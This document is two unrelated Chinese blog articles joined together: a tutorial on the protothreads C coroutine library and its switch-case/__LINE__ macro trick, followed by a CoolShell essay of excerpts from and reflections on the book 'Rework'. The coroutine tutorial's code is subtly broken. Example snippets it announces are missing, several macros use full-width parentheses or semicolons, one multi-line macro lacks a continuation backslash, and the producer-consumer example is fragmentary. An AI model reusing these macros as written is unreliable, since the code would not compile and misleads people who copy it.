很多人会好奇如此“蝇量级”的代码究竟是怎么实现的呢？在分析 protothreads 源码之前，我先来给大家补一补 C 语言的基础课;-^)简而言之，这利用了 C 语言特性上的一个“奇技淫巧”，而且这种技巧恐怕连许多具备十年以上经验的 C 程序员老手都不见得知晓。当然这里先要声明我不是推荐大家都这么用，实际上这是以破坏语言的代码规范为代价，在一些严肃的项目工程中需要谨慎对待，除非你想被炒鱿鱼。#### C 语言的“yield 语义”下面的教程来自于一位 ARM 工程师、天才黑客 Simon Tatham（开源 Telnet/SSH 客户端 PuTTY 和汇编器 NASM 的作者，吐槽一句，PuTTY的源码号称是所有正式项目里最难 hack 的 C，你应该猜到作者是什么语言出身）的博文：Coroutines in C。中文译文在这里。我们知道 python 的 yield 语义功能类似于一种迭代生成器，函数会保留上次的调用状态，并在下次调用时会从上个返回点继续执行。用 C 语言来写就像这样：连续对它调用 10 次，它能分别返回 0 到 9。该怎样实现呢？可以利用 goto 语句，如果我们在函数中加入一个状态变量，就可以这样实现：
这个方法是可行的。我们在所有需要 yield 的位置都加上标签：起始位置加一个，还有所有 return 语句之后都加一个。每个标签用数字编号，我们在状态变量中保存这个编号，这样就能在我们下次调用时告诉我们应该跳到哪个标签上。每次返回前，更新状态变量，指向到正确的标签；不论调用多少次，针对状态变量的 switch 语句都能找到我们要跳转到的位置。但这还是难看得很。最糟糕的部分是所有的标签都需要手工维护，还必须保证函数中的标签和开头 switch 语句中的一致。每次新增一个 return 语句，就必须想一个新的标签名并将其加到 switch 语句中；每次删除 return 语句时，同样也必须删除对应的标签。这使得维护代码的工作量增加了一倍。仔细想想，其实我们可以不用 switch 语句来决定要跳转到哪里去执行，而是 **直接利用 switch 语句本身来实现跳转** ：酷！没想到 switch-case 语句可以这样用，其实说白了 C 语言就是脱胎于汇编语言的，switch-case 跟 if-else 一样，无非就是汇编的条件跳转指令的另类实现而已（这也间接解释了为何汇编程序员经常揶揄 C 语言是“大便一样的代码”）。我们还可以用 __LINE__ 宏使其更加一般化：
这样一来我们可以用宏提炼出一种范式，封装成组件：怎么样，看起来像不像发明了一种全新的语言？ **实际上我们利用了 switch-case 的分支跳转特性，以及预编译的 __LINE__ 宏，实现了一种隐式状态机，最终实现了“yield 语义”。**还有一个问题，当你欢天喜地地将这种鲜为人知的技巧运用到你的项目中，并成功地拿去向你的上司邀功问赏的时候，你的上司会怎样看待你的代码呢？你的宏定义中大括号没有匹配完整，在代码块中包含了未用到的 case，Begin 和 Yield 宏里面不完整的七拼八凑……你简直就是公司里不遵守编码规范的反面榜样！别着急，在原文中 Simon Tatham 大牛帮你找到一个坚定的反驳理由，我觉得对程序员来说简直是金玉良言。将编程规范用在这里是不对的。文章里给出的示例代码不是很长，也不很复杂，即便以状态机的方式改写还是能够看懂的。但是随着代码越来越长，改写的难度将越来越大，改写对直观性造成的损失也变得相当相当大。想一想，一个函数如果包含这样的小代码块：case STATE1:     /* perform some activity */     if (condition) state = STATE2; else state = STATE3;
对于看代码的人说，这和包含下面小代码块的函数没有多大区别：LABEL1:     /* perform some activity */     if (condition) goto LABEL2; else goto LABEL3;是的，这两个函数的结构在视觉上是一样的，而对于函数中实现的算法，两个函数都一样不利于查看。因为你使用协程的宏而炒你鱿鱼的人，一样会因为你写的函数是由小块的代码和 goto 语句组成而吼着炒了你。只是这次他们没有冤枉你，因为像那样设计的函数会严重扰乱算法的结构。**编程规范的目标就是为了代码清晰。** 如果将一些重要的东西，像 switch、return 以及 case 语句，隐藏到起“障眼”作用的宏中，从编程规范的角度讲，可以说你扰乱了程序的语法结构，并且违背了代码清晰这一要求。但是我们这样做是为了突出程序的算法结构，而算法结构恰恰是看代码的人更想了解的。**任何编程规范，坚持牺牲算法清晰度来换取语法清晰度的，都应该重写。** 如果你的上司因为使用了这一技巧而解雇你，那么在保安把你往外拖的时候要不断告诉他这一点。原文作者最后给出了一个 MIT 许可证的 coroutine.h 头文件。值得一提的是，正如文中所说，这种协程实现方法有个使用上的局限，就是 **协程调度状态的保存依赖于 static 变量，而不是堆栈上的局部变量** ，实际上也无法用局部变量（堆栈）来保存状态，这就使得代码不具备可重入性和多线程应用。后来作者补充了一种技巧，就是将局部变量包装成函数参数传入的一个虚构的上下文结构体指针，然后用动态分配的堆来“模拟”堆栈，解决了线程可重入问题。但这样一来反而有损代码清晰，比如所有局部变量都要写成对象成员的引用方式，特别是局部变量很多的时候很麻烦，再比如宏定义 malloc/free 的玩法过于托大，不易控制，搞不好还增加了被炒鱿鱼的风险（只不过这次是你活该）。
我个人认为，既然协程本身是一种单线程的方案，那么我们应该假定应用环境是单线程的，不存在代码重入问题，所以我们可以大胆地使用 static 变量，维持代码的简洁和可读性。事实上 **我们也不应该在多线程环境下考虑使用这么简陋的协程** ，非要用的话，前面提到 glibc 的 ucontext 组件也是一种可行的替代方案，它提供了一种协程私有堆栈的上下文，当然这种用法在跨线程上也并非没有限制，请仔细阅读联机文档。#### Protothreads的上下文感谢 Simon Tatham 的淳淳教诲，接下来我们可以 hack 一下源码了。先来看看实现 protothreads 的数据结构， 实际上它就是协程的 **上下文结构体** ，用以保存状态变量，相信你很快就明白为何它的“堆栈”只有 2 个字节：里面只有一个 short 类型的变量，实际上它是用来保存上一次出让点的程序计数器。这也映证了协程比线程的灵活之处，就是协程可以是 stackless 的，如果需要实现的功能很单一，比如像生产者-消费者模型那样用来做事件通知，那么实际上协程需要保存的状态变量仅仅是一个程序计数器即可。像 python generator 也是 stackless 的，当然实现一个迭代生成器可能还需要保留上一个迭代值，前面 C 的例子是用 static 变量保存，你也可以设置成员变量添加到上下文结构体里面。如果你真的不确定用协程调度时需要保存多少状态变量，那还是用 ucontext 好了，它的上下文提供了堆栈和信号，但是由用户负责分配资源，详细使用方法见联机文档。。
#### Protothreads的原语和组件有点扯远了，回到 protothreads，看看提供的协程“原语”。有两种实现方法，在 ANSI C 下，就是传统的 switch-case 语句：#define LC_INIT（s） s = 0;  // 源码中是有分号的，一个低级 bug，啊哈～     #define LC_RESUME(s) switch (s) { case 0:     #define LC_SET(s) s = __LINE__; case __LINE__:     #define LC_END(s) }但这种“原语”有个难以察觉的缺陷： **就是你无法在 LC_RESUME 和 LC_END （或者包含它们的组件）之间的代码中使用 switch- case语句，因为这会引起外围的 switch 跳转错误！** 为此，protothreads 又实现了基于 GNU C 的调度“原语”。在 GNU C 下还有一种语法糖叫做标签指针，就是在一个 label 前面加 &&（不是地址的地址，是 GNU 自定义的符号），可以用 void 指针类型保存，然后 goto 跳转：
typedef void * lc_t；     #define LC_INIT(s) s = NULL     #define LC_RESUME(s) \     do { \     if (s != NULL) { \     goto *s; \     }     } while (0)     #define LC_CONCAT2(s1, s2) s1##s2     #define LC_CONCAT(s1, s2) LC_CONCAT2(s1, s2)     #define LC_SET(s) \     do { \     LC_CONCAT(LC_LABEL, __LINE__): \     （s） = &&LC_CONCAT(LC_LABEL, __LINE__); \     } while (0)好了，有了前面的基础知识，理解这些“原语”就是小菜一叠，下面看看如何建立“组件”，同时也是 protothreads API，我们先定义四个退出码作为协程的 **调度状态机** ：#define PT_WAITING 0     #define PT_YIELDED 1     #define PT_EXITED  2     #define PT_ENDED   3
下面这些 API 可直接在应用程序中调用：/* 初始化一个协程，也即初始化状态变量 */     #define PT_INIT(pt) LC_INIT((pt)->lc)/* 声明一个函数，返回值为 char 即退出码，表示函数体内使用了 proto thread，（个人觉得有些多此一举） */     #define PT_THREAD(name_args) char name_args/* 协程入口点， PT_YIELD_FLAG=0表示出让，=1表示不出让，放在 switch 语句前面，下次调用的时候可以跳转到上次出让点继续执行 */     #define PT_BEGIN(pt) { char PT_YIELD_FLAG = 1; LC_RESUME((pt)->lc)/* 协程退出点，至此一个协程算是终止了，清空所有上下文和标志 */     #define PT_END(pt) LC_END((pt)->lc); PT_YIELD_FLAG = 0; \     PT_INIT(pt); return PT_ENDED; }/* 协程出让点，如果此时协程状态变量 lc 已经变为 __LINE__ 跳转过来的，那么 PT_YIELD_FLAG = 1，表示从出让点继续执行。 */     #define PT_YIELD(pt)        \     do {            \     PT_YIELD_FLAG = 0;        \     LC_SET((pt)->lc);       \     if(PT_YIELD_FLAG == 0) {      \     return PT_YIELDED;      \     }           \     } while(0)
/* 附加出让条件 */     #define PT_YIELD_UNTIL(pt, cond)    \     do {            \     PT_YIELD_FLAG = 0;        \     LC_SET((pt)->lc);       \     if((PT_YIELD_FLAG == 0) || !(cond)) { \     return PT_YIELDED;      \     }           \     } while(0)/* 协程阻塞点(blocking),本质上等同于 PT_YIELD_UNTIL，只不过退出码是 PT_WAITING，用来模拟信号量同步 */     #define PT_WAIT_UNTIL(pt, condition)          \     do {            \     LC_SET((pt)->lc);       \     if(!(condition)) {        \     return PT_WAITING;      \     }           \     } while(0)
/* 同 PT_WAIT_UNTIL 条件反转 */     #define PT_WAIT_WHILE(pt, cond)  PT_WAIT_UNTIL((pt), !(cond))/* 协程调度，调用协程 f 并检查它的退出码，直到协程终止返回 0，否则返回 1。 */     #define PT_SCHEDULE(f) ((f) < PT_EXITED)/* 这用于非对称协程，调用者是主协程，pt 是和子协程 thread （可以是多个）关联的上下文句柄，主协程阻塞自己调度子协程，直到所有子协程终止 */     #define PT_WAIT_THREAD(pt, thread) PT_WAIT_WHILE((pt), PT_SCHEDULE(thread))/* 用于协程嵌套调度，child 是子协程的上下文句柄 */     #define PT_SPAWN(pt, child, thread)   \     do {            \     PT_INIT((child));       \     PT_WAIT_THREAD((pt), (thread));   \     } while(0)
暂时介绍这么多，用户还可以根据自己的需求随意扩展组件，比如实现信号量，你会发现脱离了操作系统环境下的信号量竟是如此简单：#define PT_SEM_INIT(s, c) (s)->count = c#define PT_SEM_SIGNAL(pt, s) ++(s)->count这些应该不需要我多说了吧，呵呵，让我们回到最初例举的生产者-消费者模型，看看protothreads表现怎样。#### Protothreads实战#define NUM_ITEMS 32     #define BUFSIZE 8static struct pt_sem mutex, full, empty;PT_BEGIN(pt);     PT_SEM_INIT(&empty, 0);     PT_SEM_INIT(&full, BUFSIZE);     PT_SEM_INIT(&mutex, 1);     PT_INIT(&pt_producer);     PT_INIT(&pt_consumer);     PT_WAIT_THREAD(pt, producer(&pt_producer) & consumer(&pt_consumer));     PT_END(pt);     }
源码包中的 example-buffer.c 包含了可运行的完整示例，我就不全部贴了。整体框架就是一个 asymmetric coroutines，包括一个主协程 driver_thread 和两个子协程 producer 和 consumer ，其实不用多说大家也懂的，代码非常清晰直观。我们完全可以通过单线程实现一个简单的事件处理需求，你可以任意添加数十万个协程，几乎不会引起任何额外的系统开销和资源占用。唯一需要留意的地方就是没有一个局部变量，因为 protothreads 是 stackless 的，但这不是问题，首先我们已经假定运行环境是单线程的，其次在一个简化的需求下也用不了多少“局部变量”。如果在协程出让时需要保存一些额外的状态量，像迭代生成器，只要数目和大小都是确定并且可控的话，自行扩展协程上下文结构体即可。当然这不是说 protothreads 是万能的，它只是贡献了一种模型，你要使用它首先就得学会适应它。下面列举一些 protothreads 的使用限制：* 由于协程是stackless的，尽量不要使用局部变量，除非该变量对于协程状态是无关紧要的，同理可推，协程所在的代码是不可重入的。
* 如果协程使用 switch-case 原语封装的组件，那么禁止在实际应用中使用 switch-case 语句，除非用 GNU C 语法中的标签指针替代。* 一个协程内部可以调用其它例程，比如库函数或系统调用，但必须保证该例程是非阻塞的，否则所在线程内的所有协程都将被阻塞。毕竟线程才是执行的最小单位，协程不过是按“时间片轮度”的例程而已。官网上还例举了更多实例，都非常实用。另外，一个叫 Craig Graham 的工程师扩展了 pt.h，使得 protothreads 支持 sleep/wake/kill 等操作，文件在此 graham- pt.h。#### 协程库 DIY 攻略看到这里，手养的你是否想迫不及待地 DIY 一个协程组件呢？哪怕很多动态语言本身已经支持了协程语义，很多 C 程序员仍然倾向于自己实现组件，网上很多开源代码底层用的主要还是 glibc 的 ucontext 组件，毕竟提供堆栈的协程组件使用起来更加通用方便。你可以自己写一个调度器，然后模拟线程上下文，再然后……你就能搞出一个跨平台的COS了（笑）。GNU Pth 线程库就是这么实现的，其原作者德国人 Ralf S. Engelschall （又是个开源大牛，还写了 OpenSSL 等许多作品）就写了一篇论文教大家如何实现一个线程库。另外 protothreads 官网上也有一大堆推荐阅读。Have fun！
（全文完）# 《Rework》摘录及感想作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn读了《Rework》这本书好多遍，每次读都有不同的感想。但从来没有把这些感想记录下来，今天把《Rework》书中的一些章节做一些摘录，并把我的一些感想总结出来。供大家参考。这是一本平生以来让我中毒很深的书，也是一本让我思考得很多的书。希望看到这篇文章的人都能好好地读读这本书。这本书并不难读，是一本你可以一口气不中断就可以读完的书。目录* 现实世界   * 被高估的“从错误中学习”   * 计划就是瞎猜   * 拒绝壮大   * 工作狂   * 挠自己的痒处   * “没时间”不是借口   * 画沙为界，立场明确   * 找好退路无异于失败   * 条件受限是好事   * 与其做个半成品，不如做好半个产品   * 关注不变因素   * 会议有毒   * 人人都得干活   * 拒绝照搬 & 将你的产品去商品化   * 做得比对手少   * 谁在乎他们在干什么   * 养成对客户说“不”的习惯   * 不要攀客户的高枝   * 一夜成名只是传说   * 员工不是13岁
#### 现实世界“这在现实世界里面行不通”，当你向人们介绍一个新创意时，人们总是这么回答你。这个“现实世界”听起来如此令人沮丧，……只有人耳熟能详，习以为常的事情才会胜利，即使是这些事情已经漏洞百出陈腐低效。揭开“现实世界”这个锅盖，你会发现居住在里的人都充斥着悲观主义和失望的情绪。更糟的是，他们想将别人拖进他们的坟墓。如果你是充满希望和野心的人，他们会试着说服你，你的想法是不可能的。他们会说你在浪费时间。**“现实世界”并不存在，那只是人的一个借口。只是某些人为了开脱 自己的无所作为，跟你一点关系也没有。**> **感想** > ：我经常会向一同事和朋友提及一些我的想法，朋友同事们经常会回答我——这个事某某人，某某团队做过了，没成功。或是对我说，你做这个事的时候，要小心这个要小心那个。我觉得，这个时候是最考验我们的时候了，要有一个清醒的头脑去分析别人的话，别人真不代表自己。这个世界上大多数人都是比较保守的，大多数都对这个现实世界都有或多或少的恐惧感。当然，你可以选择做大众，但是如果你想让你的人生有些不同，有些精彩，我还是建议你不要和大多数人想得一样， > **如果你和大多数人的想法一样，你必然会和大多数人一样的平庸** > 。当然，如果你和大多数人不一样，你要么就是天才，要么就是傻瓜。要证明你自己是不是傻瓜，我们可以看看我们过去有没有过一些小成功或小成绩。如果有，那么就应该大胆地坚持自己的想法。
#### 被高估的“从错误中学习”你真的从错误和失败里面学到什么了吗？你也许学到了别再重蹈覆辙，但是这有什么意义吗？你仍然不知道接下来该做什么。**相反的应该从成功中汲取养分。成功給予真正靠得住的教材。**失败并不是成功的先决条件。自然规律是， **逗留在过去的失败中是无法进化的，进化是建立在成功的基础上的** 。> **感想** > ：我见过和很多人都在抱怨这不好那不好，但是他们其实并不知道什么是好的，因为——没有见过好的，你将永远不知道什么是好的。就好像你没有见过什么是汽车，你就只会整天在抱怨为什么骑自行车太累。回头想想我们的编程的这个过程也是一样，我们编程技能的提高基本上都是在看到别人的那些漂亮优雅的代码。所以，你一定要去看看那些优秀人干是怎么想的，怎么干的，去那些成功的公司开开眼界。另外，你应该多想想你过去做成功过什么事？那些才是你的长处，才是让你进化的前提。#### 计划就是瞎猜除非你是算命先生，长期的商业计划是种幻想。有太多的事实证明那是超出你的掌控的：市场环境、对手、顾客、经济等等。做计划让你觉得一切尽在掌握但实际上你没有。**当你把计划变成猜测时，就等于进入一个危险的境地。做计划就是在用过去推导未来，等于给你戴上了眼罩。**
> **感想** > ：你有职业规划吗？如果你有的话，那么你就一定就错了。职业规划是一件很扯淡的事情。我和一些高手都交流过，其实这些人在当初都并不有什么职业规划的，要说有的话，也就是想把技术搞透搞精。这些人在一开始从来没有想过要当个什么经理或是什么架构师之类的东西，这些人就是对技术有非常大的热情，把身边的那些看得见够得着的事情做到好好地，并且保持不持续强大的好奇心努力地学习自己不懂的东西。一个坚定不移的决定和意志力会比任何的计划和职业规划都重要。 > **你问问自己，想不想当程序员，能不能一辈子都当一个程序员，能不能写程序写一辈子？** > （关于做一辈子程序员这个事，大家可以看看我的新浪微博 —— > _没哪个行业能像计算机行业这么活跃、刺激和有趣了。不仅是新兴工业革命的主力，又渗入到所有的行业中，干一辈子值了。//@_你亲爱的偏执狂: > 程序员首先是工程师，Professional，就跟律师，医生一样，给大家解决问题；但是另一面呢，又是艺术家，创造新奇好玩的东西。这样的职业做一辈子有什么问题？_）#### 拒绝壮大规模越大你就得承受更大压力、需要更专业、拥有更强的能力。**有没有注意到，一个小公司希望自己变大时，大公司却想要变得灵活变通** 。记住，一旦你变大了就很难在不解雇人、不破坏士气、不改变你的整个商业路线的情况下收缩规模。
扩张不必成为你的目标。我们也不是仅在讨论你已有员工数。 还有花费、租金、IT 基础结构、设备等。这些事情不会碰巧发生。 你来决定是否承受这些。如果你决定去承受，你也将遇到新的头痛问题。花费那么多，你强迫自己构建一个复杂的生意，有一大堆困难而高压的事情要解决。**小公司并不是一个起步，小公司本身就是一个伟大的目标。**> **感想** > ：很多人都会以为拥有一支成百上千人的团队而成为一个成功的标志。就像很多朋友和猎头都会问我管多少人，当我说，我就管个十人不到的团队时，他们似乎都会觉得我很平庸。他们中的一些人基本上就不会再问我在干些什么了，因为他们可能觉得这么少的人都干什么大事呢？。当然，我说了他们也不一定听得懂。人多可能恰恰说明你可能在干一个劳动密集型的事情，这并没有什么可自豪的。真正自豪的不是在战争中用人海战术让大量的人去当炮灰，而是用一个小分队端掉敌军的军火库或指挥部。所以， > **关键不是你有多少人，关键是你做的事是不是有非凡的意义，而且你用了最小当量的资源。这就好像建立一个高性能的网站一样，用成百上千的服务器不算本事，谁用的少才是本事** > 。#### 工作狂工作狂的行为不但没有必要，而且愚蠢至极。过多的工作并不代表你对项目更关注，也不代表你作了更多的贡献，这仅仅意味着你干了更多的活而已。 **工作狂制造的麻烦比解决的麻烦多** 。
工作狂往往不得要领。他们花大把大把的时间去解决问题， **他们以为能靠蛮力来弥补思维上的惰性，其结果就是折腾出一堆粗糙无用的解决方案** 。**如果你只是为了工作而工作，那么你就会丧失判断力。你的价值 观和决策方式都是扭曲** 。你没有能力去判断哪些工作值得做，哪些工作该放弃，最后搞得自己筋疲力尽，而一个筋疲力尽的人是无法作出明智的决定的。**工作狂不是英雄。他们不是在节约时间而是在浪费生命。真正的英雄早已想出了办法，搞定一切，然后回家了。**> **感想** > ：这让我想到了那些为了冲业绩的业绩KPI的制订者们，很多时候，他们的价值观和决策真是的很扭曲的。他们生生地把一种技术密集型的工作变成了劳动密集型。 > **他们其实就是在拼命地训练客户需要的那匹“更快的马”，而从来没有想过要去造个更快的交通工具。** > > > 另外，每当我在优秀员工的评比和员工的绩效考核中的跨团队比较中我们能听到很多很多的人说，XX员工工作任劳任愿，工作得很晚很晚，付出很大。老实说，我真的为这样的价值观感到悲哀。最后，我还想说说关于超时工作，我也经常学习和做自己的事情到深夜，我相信很多人也这样，但我们应该认真思考一下Rework中的这个观点， > **我们超时工作是在使用蛮力呢？还是在使用热情和兴趣呢？**
#### 挠自己的痒处想要创造一款伟大的产品或者是某项卓越的服务，最直接、最简单的方法就是去做你自己想用的东西。设计你了解的产品——你就能很快发现它到到底好不好用。**最棒的是，“解决你实际遇到的问题”会让你爱上你做的事情** 。 你知道问题所在并且熟知解决它的价值。这是无法替代的。毕竟，你会充满希望的在接下来的日子里继续做。 甚至会占据你余生所有时间。所以，最好还是做自己真正关心的东西。> **感想** > ：这就是吃自己的狗食，做自己感兴趣的事。软件项目中，我最恨的就是那种闭门造车造出来的自己都不用的东西（不是从已有业务生长出来的东西），以及那些自己不动手就在边上指指点点的各种咨询师或是喜欢动用行政命令的高层管理者。 > > > 但是，在这里，我更想说说我所理解的另一层“挠自己痒处”——有天我和一前前同事聊天，她说她在那家公司十多年了，现在老了，虽然心不老还想折腾，但是对自己的能力没自信，求稳了。我听到很多朋友想对自己有个改变，比如有QA的同学想做开发，有生活在内地的朋友想来大城市的大公司里有更爽的经历， > **这些人明明想活得更有激情，但最终在现实面前认命妥协。我说既然有痒处，还比较痒，那就应该毫不犹豫革自己的命，轰轰烈烈地活一次** > 。别等老了后悔当年没有勇气。“挠自己痒处”就是挑战自己，革自己的命，既然想了，就做吧，生命只有一次，值得我们轰轰烈烈地去为之付出。
#### “没时间”不是借口人们最常用的借口是：“时间不够。”他们宣称很想开一家公司，学一种乐器，写一本书，等等，但时间不够用。拜托，如果你善加利用，时间总是有的。把看电视或玩魔兽的时间腾出来完成你的创意；把10点上订改成11点上床，这不是怂恿你通宵达旦或是一天干足16个小时——我们要说的是，第周匀出一些业余时间来，就足够你去做些事情了。当你拥有某种强烈的渴望时，你就能挤出时间来——不管你身上是否背负着其他责任。 **事实上，真相是大多数的渴望并不是那么强烈。于是他们拿时间当借口来自我开脱。别给自己错口。**另外，永远会有正当其时的时候，你总会觉得自己会么太年轻，要么太老，要么太忙，太穷，或是别的什么原因。 **如果你总是为遇到一个完美时机而发愁，那么，完美的时机绝对不会到来** 。> **感想** ：我在“挑战无处不在”中也表达过这样的观点， > **关于热情和态度，说白了就是不要给自己找借口** > 。比如：“工作忙事多没时间学所以可以不懂”，“工作中没用到所以可以不懂”，“工作没有挑战，一直没有遇到合适的项目”等等。而且，如果你只能在万事俱备的情况下才能做事，那么，你还有什么价值呢？人的价值和竞争力就是在条件并不完美的时候还能搞定事情。
#### 画沙为界，立场明确坚定的信念能为你赢得超级粉丝，他们会为你马首是瞻，会舍身保护你，他们充满激情的口碑传播将胜过这世间一切的广告。强大的主见，也是要付出代价的，在这个过程中，会有人诋毁你，说像傲慢，冷漠。没办法，这就是人生，有人喜欢你，就有人憎恨你。如果你的说法没有引起任何人的心烦意乱，只能说明你的推广力度可能还不够。（也可能代表你比较无趣）**对我们来说，我们的产品所不能处理的和我们的产品所能处理的一样令人感到骄傲** 。我们的产品不适合每一个人，没有关系，我们愿意为了那些更加深爱我们的客户而放弃另一部分客户。这就是我们的立场。> **感想** > ：我从来不想做一个大众脸。酷壳上有很多比较有争议的文章，也有很多人说我很极端，偏执，有优越感，清高……，说什么的都有，无所谓。我有一个做新闻编辑的太太，主辑要求文章要客观和没有观点，不温不火，本来好好的一篇有观点的文章被编辑过后只剩下了一堆食之无味的文字。 > **我喜欢有鲜明的观点，因为鲜明的观点和立场能不但能让文章鲜活起来，而且还能迎来更多的不同意见和更多的思考** > （而不只是“顶”“赞”之类无意义的回复）。我并不希望我的观点是正确的，我只希望能和更多的人加入我一同思考，而思考最佳的催化剂就是争论。我从这个行为中收益到了很多很多。
#### 找好退路无异于失败你还常常听到：“你的退出战略是什么？（万一不成功，你怎么办）”甚至在你刚开始启动时就听到它。这些人不知道怎么开始就要想到怎么结束？急什么呢？如果在全情投入之前就想怎么撤出，这种逻辑不是一般的混乱。你正打算恋爱一场就计划着分手？你在第一次约会时就签订婚前协议？你会在婚礼早上先约见离婚律师？那也太荒谬了吧。**你需要的是承诺战略而不是退出战略。你要考虑的是你的项目怎样发展和成功，而不是怎样撤退** 。如果整个战略是基于撤退的，一开始你就不会有机会成功。> **感想** > ：几年前，我有一个朋友被创新工场忽悠从美国退学回来创业，我非常质疑他退学创业这个事。他对我说，没事，反正就算失败我也不会失去什么。还有一个朋友一年前从美国回国创业，也对我说，就算没搞好也没什么。我都对他们说，如果你以为用试一试的态度就可以把一个事情搞成功，那么你让这世上那些Full > Time全天候从事这个事情的并有一些积累的人情何以堪？如果你创业时都想好了失败，那就说你你对这个事没有必胜的信心，也说明连你自己都不相信这个事，你还干个什么劲啊？ > **你与其把时间用在思考如果创业没成功你会怎么办上，你还如去思考一下如何做才有更大的胜算** 。
#### 条件受限是好事“我没有足够的时间、钱、人手、经验”。不要现无谓的抱怨了。“少”不是什么坏事。“条件受限”貌似缺陷，实力优势。有限的资源能激发你在现有的条件下完成任务的能力。没有一点浪费空间，一切都需要你发挥最大的创造力。你见过囚犯用肥皂和汤勺制作武器吗？你们是“创新”的典范。只有在条件受到限制时，我们才会发挥出“小材大用”的能力。> **感想** > ：我相信这世上很多事情都是被条件受限逼过去的。我回想到我以前经常在干的性能调优，想尽一切办法榨干系统资源这件事上，我就无法不赞同这句话。想想淘宝的TFS，就是一个因为条件受限到了不得不自己干的时候，被逼出来的东西。如果你没有足够多的人，你才会去想要怎么去优化工作和开发效率，于是才会逼着你去开发一些自动化的工具，而这些工具恰恰解放了生产力可以让你更快地干更多的事。 > **只有条件受限，才会从劳动密集型中激发出知识密集型的东西** 。再回到以前我的那篇“是否需要专职的QA”一文说的到东西，如果你有很多很多帮你做测试的QA，你就不会去测试，你的团队也就不会有自动化测试等工具。这就好像在中国这个劳动力又多又廉价的大国下，基本上不需要你在技术上的创新，你只需要去不断地迁就这些低端用户，迁就这些用户越多，你还能有什么重大创新吗？真正的创新是帮助用户成长，而不是迁就用户。
#### 与其做个半成品，不如做好半个产品同时做N件事的结果就是：一大把绝妙的点子最后被转化成一个蹩脚的产品。有舍才有得，砍掉多余的野心，你就会发现慢慢做一件正事要胜过毛毛躁躁地做一堆傻事。很多东西都是越简短越好。拿起斧子动手砍吧，为了一个“伟 大”的起点，让我们把那些“挺不错”地枝节给砍掉吧。> **感想** ：这正如“为什么中国的网页设计这么烂”中说的：“中国的学生只是去记忆东西而不是真正的理解。他们从来不花时间去思考，而只是贪婪地去获取更多的信息”。与其记忆那么多的东西，还不如好好理解部分的东西。还有一种说法是：“Done > is better than > Perfect!”，这句话某些时候说得也挺对的，尤其是对于那些完美地长期不能Done的项目。但是Done一个Ugly的东西还不如不做。所以平衡Done和Perfect的方式正好就是这句话——“与其做个半成品，不好做好半个产品”，因为， > **一个半成品会让人绝望，而半个好产品会让人有所期望，这就是其中的不同** 。#### 关注不变因素**很多公司和人都关注即将到来的大事件。他们热衷于新鲜热辣的事物，追逐最新的潮流和技术** 。
这是一条愚笨之路。一旦走上这条路，你就会关注时髦、放弃本质，把注意力放到不断变化的事物上，而不是持久不变的事物上。你的事业的核心应该建立在不变的基础之上。 **你应该投资于那些人们现在需要，并且十年后仍然需要的事物上** 。要记住，时尚会凋零。只有当你聚焦于长久的功能时，你才会发现自己把握住了永不落伍的东西。> **感想** > ：一年多前，我在《来信、创业和移动互联网》中谈到过那个时尚的“移动互联网”，说了四个方向：阅读，分享交流，电商，推荐/提醒。大家可以看到现在地铁上已经不像以前很多人都在看报纸了，而是很多人都在看手机。而手机端的社交（分享和交流），电子商务，以及很多推荐、提醒都越来越火了。这些东西都是都是“常量”——十年前存在，未来十年也会存在，我们看到很多人太过着眼于手机上的应用，而不是那些不变的因素。今天还有两个巨火无比的流行词，一个是云计算，一个是大数据，那些一听到这两个词就会兴奋的人，我不知道他们有没有真正理解这两词？他们真正理解了云计算其实就是那个N多年前就提过的IT服务，关于大数据，我完全不知道为什么会火，你会因为听到中国人口有13亿你就会兴奋吗？老鼠的数量比较这个更多呢，呵呵。其实，数据无所谓大小之分，只有好数据和烂数据之分，还热数据和冷数据之分。十年前有两个更为流行的词：一个是计算网格，一个是数据网格，这两个词5年前就凋零了，今天的云计算和大数据，有多少人意识到了其中有什么相通的，或是其中的不变因素是什么？ > **大数据和云计算其实都在描述两个东西，一个是超大规模的计算能力，另一个则是服务。还有一个词是“平台化”，这可能被大家忽略了，通过平台进行计算和数据服务，这才是那计算机存在以来基本不变的东西，无论你是移动互联网，还是互联网，不管是云计算，还是大数据，都需要一个平台提供服务** > 。
#### 会议有毒世人最可恨的打扰莫过于开会。原因是：* 会议中充斥着纸上谈兵和抽象的概念，大多是不切实际的。   * 会议中能传达的信息量少之又少。   * 人们在会议中容易跑题，堪比暴风雪里的芝加哥出租车还容易迷失方向。   * 会议要求做充分的准备，但是大多数人没有时间准备这些。   * 会议制定的议程常常是模糊的，根本就没有人真正清楚目标是什么。   * 会议中难免会轮到那么一两个低能人士发言，于是大家的时间都浪费在他们的扯淡上了。   * 会议具有自我繁殖功能。一次会议总能导致另外一次，以及再导出下一次，生生不息……> **感想** ：这世上除了“他爹的TDD”开发模式，还有“他妈的TMD”开发，就是Team Meeting > Driven，很多公司有太多太多的会要开了，开会基本上成了每天工作最主要的东西，对于一些管理者来说一星期中居然有80%时间都在开会。其实，这么多的会议并不意味着你在管理，只是意味着你对要管的东西完全不知道，需要通过开会来了解。很多会完全是没有议题的，大家坐在一起东拉西扯，非常非常地低效。我通常把这种会叫做“神仙会”，用个流行语来说，就是Cloud > Meeting，大家神一要的各说各的，似乎，没有这种形式，不能证明参会者的存在，用会议来证明他们的存在，相当的可笑。对我来说， > **如果只是带一个或几个问题来开会，简直是就是扯谈，如果对于问题没有几个备选的解决方案和各方案的评估，完全没有必要开会** > 。Amazon的会议是不会有PPT的，会议组织者会要要讨论的东西写好并打印出来，在会前给参会者把要讨论的东西打印出来，开会前10分钟左右，会场里没有任何声音，每个人都在读文档，全部人读完后，直接对议题发表自己的个人意见应该怎么干，然后很快形成共识，散会。
